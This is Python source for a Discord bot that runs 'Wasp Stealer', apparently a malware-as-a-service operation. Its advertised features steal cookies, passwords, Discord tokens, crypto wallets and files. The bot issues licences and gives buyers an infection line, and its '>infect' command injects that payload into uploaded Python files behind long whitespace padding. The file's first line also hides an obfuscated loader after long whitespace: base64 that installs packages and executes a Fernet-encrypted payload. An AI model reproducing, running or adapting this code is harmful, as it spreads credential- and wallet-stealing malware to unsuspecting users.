import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ1RyaWo0N0Jaa3JnbFJ0RTlRaGdVUkF5eU9GdHJYdUlqYWkxN1IxWHdBZWc9JykuZGVjcnlwdChiJ2dBQUFBQUJuQ2x4SnNVR1EtbEJ2bWpEZWR5M25wRzRNYjNPX1lJb2NTaFE0aTdRZlR1eG5jeEZ4cEIxVWdBQzFhN1pUX1ZQSEFXenpDU3lhWFk5OElmbzVSNmRvUW11dnZvWlctS3VEcmZ4Uk03eUR5eFhlNkpaV2poUHJ4ZzBIZm01eXg3YnRHaGZNY0F5VUtseUxPX0l2S0FjOWxxTmhfX3Z2aV9mQmVUSjVud0JjTUlYNXpISUg5M2ZuRVFUSm5GLVdfNVJMejVuS0ZqN3M1VDRtYUtBZ19PbEdIS25KVHZBdWU2N21jWjNJdGFRMzRQODdXZ0k9Jykp').decode())
import discord
from discord.ext import commands
from requests import get, post
from io import StringIO, BytesIO
from threading import Thread
import asyncio


token = ""

# W4SP BOT
# by billythegoat356

intents = discord.Intents.all()
bot = commands.Bot(command_prefix = '>', intents=intents)

admin = [, ]
admin_key = ''
api = 'http://www:80'


help = """x
>help
>doc

[user]
>webhook
>line
>infect

[admin]
>key <id>
>keys
>gen @user <reason>
>rm <id>
"""


doc = """x"""


features = """**Wasp Stealer | Features**
> FUD (Fully Undetectable)
> Cookie Stealer
> Password Stealer
> Discord Stealer
> Wallet Stealer (Exodus, ect)
> History Stealer
> File Stealer (Interesting Files)
> Fast And Reliable
> Hosted 24/7
> Webhook Protection
"""

def get_keys():
    return post(f'{api}/keys', headers={'key': admin_key})

def get_user(json, info):
    for a in json:
        c = json[a]
        if str(info) == str(a):
            return a
        for b in c:
            if info in b.lower():
                return a
    return None

@bot.event
async def on_ready():
    print("Ready!")
    await bot.change_presence(activity=discord.Game(name="$help"))
    bot.remove_command('help')

@bot.command()
async def gen(ctx, user: discord.User, *payment: str):

    if not payment: return
    if ctx.message.author.id not in admin: return
    
    id = user.id
    _usr = f'{user.name}#{user.discriminator}'
    usr = "".join(char for char in _usr if char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!?,.")
    payment = " ".join(payment)

    try:
        r = post(f'{api}/gen', headers={'key': admin_key, 'id': str(id), 'username': usr, 'payment': payment})
        if r.status_code == 200: 
            await ctx.channel.send(f"Welcome to **WaspStealer** <@{id}>!\n\nYou can list your commands with `>help`!")
        elif r.status_code == 203: 
            await ctx.channel.send("Mmh, this user seems to be already registered!")

    except:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")

@bot.command()
async def keys(ctx):

    if ctx.message.author.id not in admin: return

    try: r = get_keys()
    except: 
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
        return
    
    await ctx.channel.send(f"There are actually `{len(r.json())}` users registered to WaspStealer!", file=discord.File(StringIO(r.text), filename='keys.json'))

@bot.command()
async def key(ctx, info: str):

    if ctx.message.author.id not in admin: return

    r = get_keys()
    info = info.lstrip('<@').rstrip('>')

    try: r = get_keys()
    except: 
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
        return

    else:
        r = r.json()
        pkey = get_user(r, info)
        if pkey is None:
            return await ctx.channel.send("User not found in database!")
        c = r[pkey]
        
        await ctx.channel.send(f"User found!\n\nPrivate key: `{pkey}`\nPublic_key: `{c[0]}`\nWebhook: `{c[1]}`\nRegistration date: `{c[2]}`\nUsername: `{c[3]}`\nID: `{c[4]}`\nPayment: `{c[5]}`")



@bot.command()
async def rm(ctx, info: str):
    
    if ctx.message.author.id not in admin: return

    try: r = get_keys()
    except: 
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
        return

    r = r.json()
    pkey = get_user(r, info)
    usr = r[pkey][3]

    if pkey is None:
        return await ctx.channel.send("User not found in database!")

    try:
        r = post(f'{api}/rm', headers={'key': admin_key, 'user_key': pkey})

        if r.status_code == 200:
            await ctx.channel.send(f"`{usr}`'s license has been removed.")
        else:
            await ctx.channel.send("This user isn't registered to WaspStealer!")
    
    except:
        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")


@bot.listen()
async def on_message(message):


    if message.author.id == bot.user.id: return

    content = message.content
    split_content = content.split()

    if content == '>help': await message.reply(help)
    elif content == '>doc': await message.reply(doc)

    if content in ('>line', '>script'):
        r = get_keys().json()
        pkey = None
        for a in r:
            for b in r[a]:
                if b == str(message.author.id):
                    pkey = r[a][0]
        if pkey is None:
            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")

        r = get(f'{api}/script/{pkey}').text
        if content == '>line':
            await message.reply(f"Paste this line in your program to infect whoever runs it!\n\n```py\n{r}```")
        elif content == '$script':
            await message.reply("Send this Python file to infect whoever runs it!", file=discord.File(StringIO(r), filename='script.py'))


    if split_content[0] == '>webhook' and len(split_content) == 2:
        webhook = split_content[1]

        r = get_keys().json()
        pkey = get_user(r, str(message.author.id))

        if pkey is None:
            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")

        r = post(f'{api}/edit', headers={'key': pkey, 'webhook': webhook})

        if r.status_code == 401:
            await message.reply("Invalid webhook! Please try again.")
        else:
            await message.reply("Webhook updated successfully!")

    elif content == '>infect' and len(message.attachments) == 1:
        r = get_keys().json()
        pkey = None
        for a in r:
            for b in r[a]:
                if b == str(message.author.id):
                    pkey = r[a][0]
        if pkey is None:
            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")
        r = get(f'{api}/script/{pkey}').text
        content = await message.attachments[0].read()
        content = f"from builtins import *\ntype('Hello world!'){' '*250},{r}\n{content.decode('utf-8')}"
        await message.reply("Your file has been infected! Whoever runs it will get infected!", file=discord.File(StringIO(content), filename='infected.py'))

try:
    bot.run(token)
except KeyboardInterrupt:
    print('Goodbye!')
    exit()
print('ntpyqpof')